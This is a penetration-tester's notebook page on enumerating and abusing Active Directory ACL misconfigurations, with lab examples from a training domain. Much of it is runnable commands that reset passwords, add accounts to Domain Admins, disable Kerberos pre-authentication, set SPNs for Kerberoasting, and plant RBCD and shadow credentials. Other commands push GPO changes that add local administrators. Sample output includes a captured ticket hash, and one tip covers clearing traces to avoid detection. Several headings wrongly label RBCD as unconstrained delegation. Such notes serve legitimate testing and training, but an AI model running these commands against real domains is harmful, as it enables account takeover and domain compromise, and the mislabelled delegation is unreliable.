---
created: 2026-08-04
updated: 2026-10-24
tags:
  - AD
  - AD_attacks
---
## Checklist

>[!important] Objective: **identify and abuse misconfigured AD access permissions for privilege escalation and persistence**.

- [ ] Enumerate domain-wide ACLs to discover anomalous control relationships.
- [ ] Identify permissions held by currently controlled principals (users, groups, computer accounts).
- [ ] Map raw GUIDs in ACE entries to human-readable extended rights and property sets.
- [ ] Perform ACL abuse on target user objects:
	- `GenericAll` / `ForceChangePassword` -> reset user credentials.
	- `GenericWrite` on `servicePrincipalName` -> targeted Kerberoasting.
	- `GenericWrite` on `userAccountControl` -> disable pre-auth for AS-REP roasting.
	- `GenericWrite` on `scriptPath` for logon script -> code execution.
- [ ] Perform ACL abuse on target group objects:
	- [ ] `GenericAll` / `GenericWrite` / `AddMember` / `Self` -> manipulate group membership.
- [ ] Perform ACL abuse on target computer objects:
	- [ ] `GenericWrite` on `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD).
	- [ ] `GenericWrite` on `msDS-KeyCredentialLink` (Shadow Credentials / `PKINIT`).
- [ ] Abuse DACL modification rights (`WriteDACL`):
	- [ ] Overwrite target DACL to grant explicit `GenericAll` or DCSync privileges.
- [ ] Abuse object ownership (`WriteOwner`):
	- [ ] Take ownership of target object and update DACL permissions.
- [ ] Abuse domain-level DCSync rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`):
	- [ ] Dump credential hashes directly from the Domain Controller.
- [ ] Enumerate and extract LAPS passwords (`ms-Mcs-AdmPwd` / `msLAPS-Password`).

## AD security descriptors & ACLs



## Enumerating ACLs

### Attack-surface overview and enumeration objectives

- Overly permissive or misconfigured ACLs represent a primary attack vector for privilege escalation, lateral movement, and persistence in Active Directory.

- **`GenericAll`** (full control):
	- **User object**: Force-reset user password (`ForceChangePassword`), modify authentication attributes, or assign `WriteDACL`.
	- **Group object**: Directly modify group membership (add controlled accounts to privileged groups).
	- **Computer object**: Modify `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) or `msDS-KeyCredentialLink` (Shadow Credentials).

- **`GenericWrite` / `WriteProperty`** (`WP`):
	- **`servicePrincipalName` (SPN)**: Set SPN on a user account to perform targeted Kerberoasting.
	- **`userAccountControl`**: Disable Kerberos pre-authentication to perform AS-REP roasting.
	- **`scriptPath` attribute**: Point user logon script to a malicious executable on an SMB share.
	- **`msDS-AllowedToActOnBehalfOfOtherIdentity`**: Configure RBCD on a target computer account.
	- **`msDS-KeyCredentialLink`**: Add Shadow Credentials for certificate-based impersonation via `PKINIT`.
	- **`member` attribute**: Add arbitrary members to a group.

- **`WriteDACL`** (`WD`):
	- Overwrite or inject new ACEs into the target object's DACL (e.g., grant `GenericAll` or DCSync rights).

- **`WriteOwner`** (`WO`):
	- Take ownership of the target object, then modify the object's DACL to gain full control.

- **`ForceChangePassword`** (extended right):
	- Force-reset target user password without knowing current credentials or holding domain admin rights.

- **`Self` / `AddSelf`** (Validated Write):
	- Add controlled user account directly to a target group.

- **DCSync rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`)**:
	- Replicate domain directory database secrets (including `krbtgt` hash) via MS-DRSR.


- **Key object classes to check**:
	- User objects
	- Group objects
	- Computer objects
	- Domain Controllers 
	- Domain Root 

- **Key ACL rights to look for:**
	- `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`
	- `Self-Membership` (ACE with `ExtendedRight` and `ObjectAceType` = `Self-Membership` GUID)
	- `ForceChangePassword` (same, different GUID)
	- `AddMember` (for groups)

| Permission                   | Allows...                                                                      |
| ---------------------------- | ------------------------------------------------------------------------------ |
| `GenericAll`                 | Full control over the target object.                                           |
| `GenericWrite`               | Broad property modification.                                                   |
| `WriteProperty`              | Modification of one or more attributes.                                        |
| `WriteDACL`                  | Modification of the target's DACL (including granting additional permissions). |
| `WriteOwner`                 | Taking ownership and obtaining DACL control.                                   |
| `AllExtendedRights`          | Exercising extended rights applicable to the object.                           |
| `ForceChangePassword`        | Resetting another user's password.                                             |
| `AddMember`                  | Modifying group membership.                                                     |
| `AddSelf`                    | Adding the controlled principal to a group.                                    |
| `CreateChild`                | Creating specified child objects under a container/OU.                         |
| `DeleteChild` / `DeleteTree` | Destructive control over descendants.                                          |
| Replication rights           | DCSync-equivalent control over the domain.                                     |
| Sensitive attribute writes   | Enabling RBCD, Shadow Credentials, SPN modification, etc.                      |

>[!note] To enumerate AD ACLs, in most cases, you need an authenticated context (`ReadControl` is the minimum right to read a security descriptor).

- To enumerate ACLs from Windows, you can use [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/).

```powershell
Import-Module .\PowerView.ps1
```

| Command                     | Description                                                                 |
| --------------------------- | -------------------------------------------------------------------------- |
| `Find-InterestingDomainAcl` | Enumerate domain-wide ACEs granting non-default rights to non-built-in principals. |
| `Get-DomainObjectAcl`       | Read the ACEs set on a specific object (alias `Get-ObjectAcl`).            |
| `Add-DomainObjectAcl`       | Add an ACE to an object's DACL.                                            |
| `ConvertFrom-SID`           | Resolve a trustee SID to a readable name (alias `Convert-SidToName`).      |
| `Convert-NameToSid`         | Resolve a name to a SID (alias `ConvertTo-SID`).                           |

### Domain-wide enumeration

- To enumerate all domain ACEs with non-standard rights granted to non-built-in accounts (RID > `1000`), you can use [`Find-InterestingDomainAcl`](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainAcl/):

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
```

>[!note] If executed as-is, the output of `Find-InterestingDomainAcl` can be overwhelming. To make it more comprehensible, filter the output and select only selected object properties.

- To make the output more readable, display only selected properties:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN, SecurityIdentifier, IdentityReference, ActiveDirectoryRights, ObjectAceType
```

>[!example]-
> ```powershell
> Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights, ObjectAceType
> ```
> 
> ```powershell
> ObjectDN                  IdentityReference                  ActiveDirectoryRights ObjectAceType
> --------                  -----------------                  --------------------- -------------
> DC=INLANEFREIGHT,DC=LOCAL                                            ExtendedRight User-Change-Password
> DC=INLANEFREIGHT,DC=LOCAL                                            ExtendedRight User-Force-Change-Password
> DC=INLANEFREIGHT,DC=LOCAL                   CreateChild, DeleteChild, ListChildren ms-Exch-Active-Sync-Devices
> DC=INLANEFREIGHT,DC=LOCAL                                            ExtendedRight DS-Replication-Synchronize
> DC=INLANEFREIGHT,DC=LOCAL                                            ExtendedRight DS-Replication-Get-Changes
> DC=INLANEFREIGHT,DC=LOCAL                                            ExtendedRight DS-Replication-Get-Changes-All
> DC=INLANEFREIGHT,DC=LOCAL                                              CreateChild Computer
> DC=INLANEFREIGHT,DC=LOCAL                                              CreateChild Group
># ...
> ```

| PowerView field         | What it represents in the ACE                                                                                                                                              |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ObjectDN`              | The **target AD object** being granted permissions.                                                                                                                        |
| `SecurityIdentifier`    | The **SID of the trustee** (user, group, computer) that *holds* the permissions.                                                                                           |
| `IdentityReference`     | The **username of the trustee** (user, group, computer) that *holds* the permissions.                                                                                      |
| `ActiveDirectoryRights` | The category of permission granted (e.g., `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ReadProperty`, `WriteProperty`, `ExtendedRight`, etc.).                |
| `ObjectAceType`         | The target schema object or specific extended right that the permission applies to.<br>With `-ResolveGUIDs`, PowerView turns the GUID into a readable name where possible. |
| `AceType`               | Whether the ACE is `AccessAllowed` or `AccessDenied`.                                                                                                                      |
| `IsInherited`           | Whether the ACE is set explicitly on the object or inherited from a parent container.                                                                                      |
| `InheritanceFlags`      | Whether the ACE propagates to child objects, and to which.                                                                                                                 |

- Filter for dangerous rights: 

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
	Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight'} | 
	Select-Object ObjectDN, SecurityIdentifier, IdentityReference, ActiveDirectoryRights, ObjectAceType
```

>[!example]+
> ```powershell
> ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
> SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5189
> IdentityReference     :
> ActiveDirectoryRights : ExtendedRight
> ObjectAceType         : User-Change-Password
> ```
> 
> - The principal with SID ending in `-5189` has the ability to force-reset user passwords across the domain root context.

>[!note] `Find-InterestingDomainAcl` often returns blank `IdentityReference` values if LDAP/RPC name resolution fails. To fix it, you can force resolution using [`ConvertFrom-SID`](https://powersploit.readthedocs.io/en/latest/Recon/ConvertFrom-SID/).

- Find all dangerous ACEs and force-resolve trustee SIDs to readable names:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
  Where-Object { 
	  $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' } | 
  Select-Object ObjectDN, 
	  @{Name="Trustee"; Expression={ if($_.IdentityReference){$_.IdentityReference} else { ConvertFrom-SID $_.SecurityIdentifier } }}, 
	  ActiveDirectoryRights, ObjectAceType
```

>[!example]-
> ```powershell
> ObjectDN                  Trustee                                    ActiveDirectoryRights ObjectAceType
> --------                  -------                                    --------------------- -------------
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Exchange Windows Permissions         ExtendedRight User-Change-Password
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Exchange Windows Permissions         ExtendedRight User-Force-Change-Password
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Exchange Servers                     ExtendedRight DS-Replication-Synchronize
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\adunn                                ExtendedRight DS-Replication-Get-Changes-In-Filtered-Set
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\adunn                                ExtendedRight DS-Replication-Get-Changes
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\adunn                                ExtendedRight DS-Replication-Get-Changes-All
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Exchange Windows Permissions DeleteTree, WriteDacl All
> DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Exchange Trusted Subsystem              GenericAll All
> # ...
> ```
> 
> - `adunn` holds both replication rights on the domain root — a DCSync path (see [[#DCSync rights]]).
> - `Exchange Windows Permissions` holds `WriteDacl` on the domain root — any member can grant itself replication rights.

> [!tip]+
> - Limit ACL enumeration to an OU:
> 
> ```powershell
> Find-InterestingDomainAcl -SearchBase 'OU=Servers,DC=example,DC=com' -ResolveGUIDs
> ```
> 
> - OUs to try:
> 
> ```bash
> OU=Servers 
> OU=Workstations 
> OU=Domain Controllers 
> OU=Users 
> OU=Service Accounts 
> OU=Admins
> ```
> 

### Target-centric enumeration (who controls a specific object?)

- Check who has control over a specific user/group/computer object:

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | 
	Select-Object ObjectDN, 
		@{Name='Trustee'; Expression={ ConvertFrom-SID $_.SecurityIdentifier }}, 
		ActiveDirectoryRights, 
		ObjectAceType, 
		IsInherited
```

>[!note] Object-specific ACEs often contain GUIDs representing attributes, extended rights, object classes, property sets, etc. `-ResolveGUIDs` translates these into human-readable names.

>[!note] See [`Get-DomainObject`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObject/) (PowerView).
### Principal-centric enumeration (what can this specific user/group control?)

- Extract the SID of your interest:

```powershell
$sid = Convert-NameToSid 'jdoe'
```

- Query all objects where a specific SID holds dangerous rights:

```powershell
Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object {
        $_.SecurityIdentifier -eq $sid -and
        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight'
    } |
    Select-Object ObjectDN, 
				  @{N='Trustee';E={ConvertFrom-SID $_.SecurityIdentifier}},
				  ActiveDirectoryRights,
				  ObjectAceType
```

>[!note] The same query answers "what does this **group** control?" — pass the group's SID as `$sid`. Every member of the group inherits whatever control the group holds.

>[!important] Accounts inherit rights through direct assignment **and** group memberships. For a complete enumeration, extract all SIDs associated with a user first.

- For a set consisting of the user plus their groups:

```powershell
$user_identity = 'jdoe'
$sid = Convert-NameToSid $user_identity
$group_sids = Get-DomainGroup -MemberIdentity $user_identity |
    Select-Object -ExpandProperty ObjectSID
$all_sids = @($sid) + @($group_sids)
```

- Then query ACEs whose trustee SID belongs to that set:

```powershell
Get-DomainObjectAcl -ResolveGUIDs |
Where-Object {
    $_.SecurityIdentifier -in $all_sids -and
    $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight'
} |
Select-Object ObjectDN,
              @{N='Trustee';E={Convert-SidToName $_.SecurityIdentifier}},
              ActiveDirectoryRights,
              ObjectAceType
```

### Checking what rights a specific principal has over a specific object

- Check what rights a specific principal has over a specific object:

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |
    Where-Object {$_.SecurityIdentifier -eq (Convert-NameToSid 'jdoe')}
```

>[!example]-
> - Enumerate what privileges the user `forend` has over the user `dpayne`:
> 
> ```powershell
> Get-DomainObjectAcl -Identity 'dpayne' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Convert-NameToSid 'forend')}
> ```
> 
> ```powershell
> AceType               : AccessAllowed
> ObjectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> ActiveDirectoryRights : GenericAll
> ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152
> IsInherited           : False
> SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
> AccessMask            : 983551
> AceQualifier          : AccessAllowed
> ```
> 
> - `AccessMask` `983551` is the `GenericAll` bitmask. `forend` has full control over `dpayne`.

### Enumerating OU permissions

- Enumerate ACLs on every OU:

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs
```

- Look for:
	- `CreateChild` 
	- `GenericAll`
	- `GenericWrite`
	- `WriteDacl`
	- `WriteOwner`
	- `WriteProperty`
- Then examine `IsInherited` (whether the ACE is explicit or inherited), `InheritanceFlags` (whether the ACE propagates to objects inside the OU, and to which), and `AceType` (Allow or Deny).

### DCSync audit

- Since DCSync-relevant rights are normally assigned on the **domain naming context**, inspect the domain root:

```powershell
Get-DomainObjectAcl -Identity "DC=example,DC=com" -ResolveGUIDs | 
Where-Object { 
	  $_.ObjectAceType -match 'Replication' 
}
```

- To also force-resolve SIDs:

```powershell
Get-DomainObjectAcl -Identity "DC=example,DC=com" -ResolveGUIDs | 
Where-Object { 
	  $_.ObjectAceType -match 'Replication' 
} | 
Select-Object @{Name='Trustee'; Expression={Convert-SidToName $_.SecurityIdentifier}}, 
			  ActiveDirectoryRights, 
			  ObjectAceType
```

- Look for:
	- `DS-Replication-Get-Changes`
	- `DS-Replication-Get-Changes-All`
	- `DS-Replication-Get-Changes-In-Filtered-Set`

>[!note] See [[DCSync]].

### Force-password-reset audit

- Enumerate all ACEs that specify `ForceChangePassword` extended right:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
Where-Object { $_.ObjectAceType -match 'Force-Change-Password' } | 
Select-Object ObjectDN, @{Name='Trustee'; Expression={ ConvertFrom-SID $_.SecurityIdentifier }}
```

- Enumerate ACEs that specify `ForceChangePassword` extended rights for a specific principal:

```powershell
$sid = Convert-NameToSid 'jdoe'
```
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
Where-Object {
	$_.ObjectAceType -match 'Force-Change-Password' -and 
	$_.SecurityIdentifier -eq $sid
}
```

### Windows-native `dsacls`

- On Windows, you can use the [`dsacls`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)) command to examine an AD object's properties. With no modification arguments, it displays the object's owner and DACL. This is useful when PowerShell or PowerView is unavailable.

- Inspect a user:

```cmd
dsacls "CN=John Doe,CN=Users,DC=example,DC=com"
```

- Inspect auditing (SACL) entries (`/A`):

```cmd
dsacls "CN=John Doe,CN=Users,DC=example,DC=com" /A
```

- Inspect the domain root:

```cmd
dsacls "DC=example,DC=com"
```

>[!note] `dsacls` also grants permissions (`/G`) and takes ownership — see [[#WriteDACL]] and [[#WriteOwner]].

### Impacket `dacledit.py` (Linux)

- To query ACLs directly from a Linux host, you can use Impacket's [`dacledit.py`](https://github.com/fortra/impacket/blob/master/examples/dacledit.py).

- Read a user:

```bash
dacledit.py -action read -target rwade -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

- Inspect a group:

```bash
dacledit.py -action read -target 'Domain Admins' -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

- Filter user object's ACEs to those associated with the specified principal:

```bash
dacledit.py -action read -target rwade -principal jdoe -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

>[!note] The above command looks for ACEs that give rights to the user `jdoe` over the user `rwade`.

### `bloodyAD` (Linux)

- [`bloodyAD`](https://github.com/CravateRouge/bloodyAD)'s `get writable` module lists the objects the authenticated user can write to:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' get writable --detail
```

- Filter by object type and right:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' get writable --otype USER --right WRITE --detail
```

### BloodHound / SharpHound

>[!note] See [[🛠️ BloodHound]].

- BloodHound renders object-control edges (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddMember`, `AddKeyCredentialLink`, `AllowedToAct`, `GetChanges` / `GetChangesAll`) so you can trace a full control chain to a high-value target. Right-click an edge for abuse guidance.

>[!warning] BloodHound doesn't model every write primitive — it may not surface `WriteProperty` on attributes such as `scriptPath` or `profilePath`. Confirm those with PowerView or `dacledit.py`.
## Attacking ACLs

### `GenericAll`

>[!important] `GenericAll` grants full control over an AD object.

- `GenericAll` on a user object effectively grants you full control over the target account. You can change their password, assign an SPN, disable pre-authentication, or add certificate-based credentials to authenticate as that user without changing their password.
	- **`GenericAll` on a user object** -> reset password, enable/disable account, modify SPNs and other account attributes.
	- **`GenericAll` on a group object** -> modify group membership (add controlled accounts to privileged groups).
	- **`GenericAll` on a computer object** -> modify computer-account attributes, including `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) and `msDS-KeyCredentialLink` (Shadow Credentials).
	- **`GenericAll` on a GPO** -> modify the Group Policy Object to execute a script or binary with high privileges when the policy applies.
	- **`GenericAll` on an OU** -> modify the OU and its ACL; impact depends on how ACEs are inherited by descendants.

>[!note] See [[Shadow credentials]].

>[!tip]+
>- Confirm `GenericAll` on an object using [`Get-DomainObject`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObject/) (PowerView):
> ```powershell
> $my_sid = (Get-DomainUser jdoe).ObjectSID
> Get-DomainObjectAcl -Identity rwade -ResolveGUIDs |
>     Where-Object {
>         $_.SecurityIdentifier -eq $my_sid -and
>         $_.ActiveDirectoryRights -match 'GenericAll'
>     }
> ```
> 
> - List every ACE that has `GenericAll` over the target user:
> 
> ```powershell
> Get-DomainObjectAcl -Identity rwade -ResolveGUIDs |
>     Where-Object { $_.ActiveDirectoryRights -match 'GenericAll' } |
>     Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType
> ```
> - Resolve an SID:
> ```powershell
> ConvertFrom-SID 'S-1-5-21-...'
> ```

#### `GenericAll` on a user object

##### Resetting the user's password

- `GenericAll` on a user object, same as `ForceChangePassword`, allows you to **reset the user's password**.

>[!note] See [[#ForceChangePassword on a user object]].
##### Enabling the account

- If the account is disabled, clear the UAC flag to enable it (`GenericAll` allows editing `userAccountControl`).
- `ActiveDirectory` module:

```powershell
Enable-ADAccount -Identity 'rwade'
```

- Native Windows `net`:

```cmd
net user rwade /active:yes
```

>[!tip]+
> - Verify:
> 
> ```powershell
> Get-ADUser rwade | Select-Object SamAccountName, Enabled
> ```

- `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' remove uac rwade -f ACCOUNTDISABLE
```
##### Assigning an SPN

###### From Windows

- With `GenericAll` on a user account, you can assign them an **SPN (Service Principal Name)** to then perform [[Kerberoasting]] (more precisely, targeted Kerberoasting, [[Kerberoasting#Targeted Kerberoasting]]).

- Using the native Windows [`setspn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn):

```powershell
setspn -S HTTP/app01.example.com EXAMPLE.COM\rwade
```

>[!tip]+
>- Verify:
>```cmd
>setspn -L EXAMPLE.COM\rwade
>```

- Set an SPN using [`Set-DomainObject`](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) (PowerView):

```powershell
$pass = ConvertTo-SecureString 'passwd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('EXAMPLE.COM\jdoe', $pass)
```

```powershell
Set-DomainObject -Credential $cred -Identity rwade -Set @{serviceprincipalname="nonexistent/NOTHING"}
```

- Set an SPN using `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' set attribute rwade servicePrincipalName -v 'nonexistent/NOTHING'
```

>[!tip]+
>- Request TGS ticket for offline cracking using `GetUserSPNs.py` ([[Kerberoasting]]):
> 
> ```bash
> GetUserSPNs.py example.com/jdoe:'passwd123' -request-user rwade -outputfile rwade_tgs.txt
> ```
> - Clear the SPN after requesting the ticket to minimize detection:
> 
> ```powershell
> Set-DomainObject -Identity rwade -Clear serviceprincipalname
> ```

> [!example]-
> ```powershell
> Set-DomainObject -Credential $cred2 -Identity adunn -Set @{serviceprincipalname='nonexistent/nothing'} -Verbose
> ```
> 
> ```powershell
> VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'nonexistent/nothing' for object 'adunn'
> ```
> 
> ```powershell
> .\Rubeus.exe kerberoast /user:adunn /nowrap
> ```
> 
> ```powershell
> [*] Target User            : adunn
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] SamAccountName          : adunn
> [*] ServicePrincipalName    : nonexistent/nothing
> [*] Supported ETypes        : RC4_HMAC_DEFAULT
> [*] Hash                    : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$nonexistent/nothing@INLANEFREIGHT.LOCAL*$AC2F829CA93F3D8E9B7C39F9455AAF98$19D2204DEDBB3B4D...<truncated>
> ```
##### Disabling Kerberos pre-authentication

- You can also disable pre-authentication for the user, which makes the account vulnerable to [[AS-REP roasting]].

- Disable Kerberos pre-authentication using [`Set-DomainObject`](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) (PowerView):

```powershell
$pass = ConvertTo-SecureString 'passwd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('EXAMPLE.COM\jdoe', $pass)
```

```powershell
Set-DomainObject -Credential $cred -Identity rwade -XOR @{UserAccountControl=4194304}
```
#### `GenericAll` on a group object

- Add yourself to the group using [`Add-DomainGroupMember`](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) (PowerView):

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jdoe'
```

- Using `ActiveDirectory` module:

```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members 'jdoe'
```

- Using Windows native `net`:

```cmd
net group "Domain Admins" jdoe /add /domain
```

- `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add groupMember 'Domain Admins' 'jdoe'
```

>[!note] `Members` can be a group as well as a user. Adding a group you already control as a member **nests** it into the target group, so every member of your group inherits the target group's access.

>[!tip]+
> - Verify membership:
> 
> ```powershell
> Get-ADGroupMember 'Domain Admins' | Select-Object Name, SamAccountName, ObjectClass
> ```
> - For nested membership:
> ```powershell
> Get-ADGroupMember 'Domain Admins' -Recursive
> ```

>[!note] If the target group is nested into `Remote Management Users`, you will immediately gain WinRM access on hosts honoring that group.
>```bash
>evil-winrm -i 10.129.201.248 -u jdoe -p 'passwd123'
>```
#### `GenericAll` on a computer object

- `GenericAll` on a computer account lets you write the delegation and key-credential attributes:
	- Write `msDS-AllowedToActOnBehalfOfOtherIdentity` to configure [[Unconstrained delegation]] and impersonate high-privileged users to the host. See [[#WriteProperty for msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object]].
	- Write `msDS-KeyCredentialLink` to add shadow credentials and authenticate as the computer via `PKINIT`. See [[#WriteProperty for msDS-KeyCredentialLink on a user or computer object]].
- If LAPS manages the host's local administrator password, full control also exposes the LAPS attributes. See [[#LAPS attribute abuse]].

#### `GenericAll` on a GPO

- You can exploit `GenericAll` on a Group Policy Object (GPO) to add a startup/logon script to the `Computer Configuration` or `User Configuration` policies to execute code with high privileges. 

- For example, you can use the following [`SharpGPOAbuse`](https://github.com/ReversecLabs/SharpGPOAbuse) command to add a new local administrator:

```cmd
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Default Domain Policy"   
```

- From Linux, use [`pyGPOAbuse`](https://github.com/Hackndo/pyGPOAbuse) with the target GPO's GUID:

```bash
pygpoabuse.py example.com/jdoe:'passwd123' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators attacker /add'
```

>[!warning] A GPO change applies to every object in its scope. Prefer linking a new GPO to a narrow test OU over editing a broad default policy on an engagement.
#### `GenericAll` on an OU

- The most common way to abuse `GenericAll` on an OU is to add an **inheritable** ACE so your rights propagate to every current and future child object (users, computers, groups) under the OU.

- With `dacledit.py`, the `-inheritance` flag marks the ACE inheritable:

```bash
dacledit.py -action write -rights FullControl -principal jdoe -target-dn 'OU=Workstations,DC=example,DC=com' -inheritance -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

- With `dsacls` on Windows, `/I:T` applies the grant to the object and its sub-objects:

```cmd
dsacls "OU=Workstations,DC=example,DC=com" /I:T /G "EXAMPLE\jdoe:GA"
```

>[!note] Inherited ACEs don't reach objects protected by `adminCount=1` (members of protected groups, enforced by AdminSDHolder).

### `WriteProperty`

>[!important] `WriteProperty` grants permission to modify one or more attributes on an AD object.

- Unlike `GenericWrite`, `WriteProperty` is often attribute-specific. Therefore, exploitation depends not only whether and on which objects you have `WriteProperty`, but also which attributes you can write.
	- **`WriteProperty` for `servicePrincipalName` on a user or computer object** -> modify SPNs. 
	- **`WriteProperty` for `userAccountControl` on a user or computer object** -> alter user flags (disable Kerberos pre-authentication to subsequently perform [[AS-REP roasting]]).
	- **`WriteProperty` for `member` on a group object** -> modify group membership.
	- **`WriteProperty` for `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object** -> [[Unconstrained delegation]].
	- **`WriteProperty` for `msDS-KeyCredentialLink` on a user or computer object** -> modify credentials.
	- **`WriteProperty` for `scriptPath` on a user object** -> modify logon-script configuration.
	- **`WriteProperty` for `profilePath` on a user object** -> modify profile configuration.
	- **`WriteProperty` for `gPLink` on an OU, site, or domain object** -> modify GPO linkage.

#### `WriteProperty` for `servicePrincipalName` on a user or computer object

- With `WriteProperty` for `servicePrincipalName` on a user or computer object, you can assign an SPN to perform the [[Kerberoasting]] attack against that object.

```cmd
setspn -S HTTP/app01.example.com EXAMPLE.COM\rwade
```

>[!note] See [[#Assigning an SPN]].
#### `WriteProperty` for `userAccountControl` on a user or computer object

- `WriteProperty` for `userAccountControl` on a user or computer object allows you to modify that object's account flags.
- For example, you can **set `DoesNotRequirePreAuth` to `True` to disable Kerberos pre-authentication** and then perform the [[AS-REP roasting]] attack.

```powershell
$pass = ConvertTo-SecureString 'passwd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('EXAMPLE.COM\jdoe', $pass)
```

```powershell
Set-DomainObject -Credential $cred -Identity rwade -XOR @{UserAccountControl=4194304}
```

>[!note] See [[#Disabling Kerberos pre-authentication]].
#### `WriteProperty` for `member` on a group object

- `WriteProperty` for `member` on a group object allows you to modify the group's membership. For example, you can exploit this by adding yourself to a privileged group — given `WriteProperty` on that group.

```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members jdoe
```

>[!note] See [[#GenericAll on a group object]].

#### `WriteProperty` for `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object

- Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer lets you configure RBCD: populate it with the SID of a machine account you control, then use S4U to obtain a service ticket as any user to that host.

- `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add rbcd 'TARGET$' 'ATTACKER$'
```

- Impacket `rbcd.py`:

```bash
rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKER$' -action write -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

>[!note] See [[Unconstrained delegation]] for obtaining a controlled machine account and the S4U ticket-request chain.
#### `WriteProperty` for `msDS-KeyCredentialLink` on a user or computer object

- `WriteProperty` for `msDS-KeyCredentialLink` on a user or computer object allows you to **modify that object's credentials**.
- By writing a rogue public key to the `msDS-KeyCredentialLink` attribute, you can authenticate as the target user or computer via Kerberos `PKINIT` (pre-authentication with certificates), the [[Shadow credentials]] attack.

- `pywhisker` (Linux):

```bash
pywhisker.py -d example.com -u jdoe -p 'passwd123' --target targetuser --action add
```

- `certipy`:

```bash
certipy shadow auto -u jdoe@example.com -p 'passwd123' -account targetuser
```

- `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add shadowCredentials targetuser
```

>[!note] See [[Shadow credentials]] for the `PKINIT` authentication chain and recovering the NT hash.
#### `WriteProperty` for `scriptPath` on a user object

